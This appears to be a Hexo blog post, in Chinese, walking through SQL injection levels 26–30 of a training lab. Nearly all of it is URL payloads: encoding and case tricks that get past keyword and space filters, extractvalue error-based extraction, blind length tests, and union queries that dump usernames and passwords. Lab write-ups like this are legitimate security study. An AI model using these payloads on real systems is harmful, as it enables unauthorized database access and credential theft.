@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>sql 26-30关 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="sql第二十六关 1.此关单引号闭合，过滤了 or，and ， &#x2F;* , – , # , 空格 , &#x2F;，可以考虑直接用url编码绕过注入，and和or直接用&amp;&amp;和||绕过即可，&amp;&amp;的url编码是%26%26，空格的url编码是%A0，直接输入?id&#x3D;1’;%00和order by 3（如果空格过滤的太多，可以直接以在查询语句中添加完整括">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql 26-30关">
+<meta property="og:url" content="http://example.com/2023/04/11/sql-26-30%E5%85%B3/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="sql第二十六关 1.此关单引号闭合，过滤了 or，and ， &#x2F;* , – , # , 空格 , &#x2F;，可以考虑直接用url编码绕过注入，and和or直接用&amp;&amp;和||绕过即可，&amp;&amp;的url编码是%26%26，空格的url编码是%A0，直接输入?id&#x3D;1’;%00和order by 3（如果空格过滤的太多，可以直接以在查询语句中添加完整括">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-04-11T14:41:20.000Z">
+<meta property="article:modified_time" content="2023-04-11T15:29:16.957Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-sql-26-30关" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/04/11/sql-26-30%E5%85%B3/" class="article-date">
+  <time class="dt-published" datetime="2023-04-11T14:41:20.000Z" itemprop="datePublished">2023-04-11</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      sql 26-30关
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>sql第二十六关</p>
+<p>1.此关单引号闭合，过滤了 or，and ， &#x2F;* , – , # , 空格 , &#x2F;，可以考虑直接用url编码绕过注入，and和or直接用&amp;&amp;和||绕过即可，&amp;&amp;的url编码是%26%26，空格的url编码是%A0，直接输入?id&#x3D;1’;%00和order by 3（如果空格过滤的太多，可以直接以在查询语句中添加完整括号的形式代替空格的作用）</p>
+<p>2.?id&#x3D;1’ %26%26 extractvalue(1,concat(0x7e,database(),0x7e));%00爆库名</p>
+<p>3.?id&#x3D;1’ %26%26 extractvalue(1,concat(0x7e,(select(group_concat(table_name)) from (infoorrmation_schema.tables) where (table_schema&#x3D;’security’)),0x7e));%00（像这样做，即便空格被过滤掉字符串也不会挤在一起了）</p>
+<p>4.?id&#x3D;1’ %26%26 extractvalue(1,concat(0x7e,(select (group_concat(username)) from (users)),0x7e));%00爆数据</p>
+<p>sql第二十六a关</p>
+<p>1.单引号注入，但没有报错信息，用盲注，先判断注是’)型闭合</p>
+<p>2.输入?id&#x3D;2’) %26%26 length(database())&gt;5 %26%26 ‘1’&#x3D;(‘1判断数据库长度</p>
+<p>3.?id&#x3D;2’) %26%26 (select(count(table_name)) from (infoorrmation_schema.tables) where (table_schema&#x3D;’security’))&gt;5 %26%26 ‘1’&#x3D;(‘1判断字母</p>
+<p>4.?id&#x3D;2’) %26%26 substr((select(table_name) from (infoorrmation_schema.tables) where (table_schema&#x3D;’security’)(limit 0,1)),1,1)&gt;’m’ %26%26 ‘1’&#x3D;(‘1判断表的张数</p>
+<p>5.略</p>
+<p>sql第二十七关</p>
+<p>1.这关把union和select过滤了，关键字大小写切换一下就行了</p>
+<p>2.0’%A0UnIoN%A0SeLeCt(1),group_concat(username),group_concat(password)%A0from%A0security%2Eusers%A0where%A01%26%26%a0’1举个例子</p>
+<p>3.接下来同上，用此种方式绕过空格过滤即可，.的url编码是%2E</p>
+<p>sql第二十七a关</p>
+<p>1.闭合是”，不能用报错注入，但可以联合查询，输入?id&#x3D;0” %0a unioN %0a selecT %0a 1,2,3;%00</p>
+<p>2.输入?id&#x3D;0” %0a unioN %0a selecT %0a 1,database(),version();%00爆库</p>
+<p>3.?id&#x3D;0” %0a unioN %0a selecT %0a 1,2,(group_concat(table_name)) from (information_schema.tables) where (table_schema&#x3D;database());%00</p>
+<p>4.%0a unioN %0a selecT %0a 1,2,(group_concat(column_name)) from (information_schema.columns) where (table_schema&#x3D;database()) and (table_name&#x3D;’users’) ;%00</p>
+<p>5.?id&#x3D;0” %0a unioN %0a selecT %0a 1,(group_concat(username)),(group_concat(password)) from (users);%00</p>
+<p>sql第二十八关</p>
+<p>1.union和select被过滤，输入?id&#x3D;1’);%00，闭合。那么闭合点就是’)，而且不能再用报错注入了，发现这关会过滤union select的组合，所以一般用空格编码的方式是不管用了，所以采用union union select select方法绕过，空格照样用%0a替换，输入0’)%A0UnIoN%A0SeLeCt(1),version(),database()%26%26%a0(‘1成功</p>
+<p>2.?id&#x3D;0’) %0a unioN union%0a select %0a selecT %0a1,2,3;%00看回显位</p>
+<p>3.输入?id&#x3D;0’) %0a unioN union%0a select %0a selecT %0a 1,database(),version();%00，爆库</p>
+<p>4.?id&#x3D;0’) %0a unioN union%0a select %0a selecT %0a 1,2,(group_concat(table_name)) from (information_schema.tables) where (table_schema&#x3D;database());%00</p>
+<p>5.?id&#x3D;0’) %0a unioN union%0a select %0a selecT %0a 1,2,(group_concat(column_name)) from (information_schema.columns) where (table_schema&#x3D;database()) and (table_name&#x3D;’users’) ;%00</p>
+<p>6.?id&#x3D;0’) %0a unioN union%0a select %0a selecT %0a 1,(group_concat(username)),(group_concat(password)) from (users);%00</p>
+<p>sql第二十八a关</p>
+<p>1.输入?id&#x3D;1’);%00，成功闭合。确定闭合点是’)</p>
+<p>2.直接union联合查询</p>
+<p>sql第二十九关</p>
+<p>1.这关的欢迎词又变了，页面显示This Site Protected by world’s Best firewall，可以报错，直接?id&#x3D;1’ and extractvalue(1,concat(0x7e,database(),0x7e))–+</p>
+<p>2.?id&#x3D;1’ and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e))–+</p>
+<p>3.接下来操作无变化</p>
+<p>sql第三十关</p>
+<p>1.多设了一个没有变化的关</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/04/11/sql-26-30%E5%85%B3/" data-id="clgcf4m670000isxx48pebblb" data-title="sql 26-30关" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2023/12/15/sql-11-15%E5%85%B3/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          sql 11-15关
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/12/23/test/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">test</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">December 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/10/">October 2022</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/12/15/sql-11-15%E5%85%B3/">sql 11-15关</a>
+          </li>
+        
+          <li>
+            <a href="/2023/04/11/sql-26-30%E5%85%B3/">sql 26-30关</a>
+          </li>
+        
+          <li>
+            <a href="/2022/12/23/test/">test</a>
+          </li>
+        
+          <li>
+            <a href="/2022/12/18/sql-21-25%E5%85%B3/">sql 21-25关</a>
+          </li>
+        
+          <li>
+            <a href="/2022/12/17/sql-16-20%E5%85%B3/">sql 16-20关</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2023 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
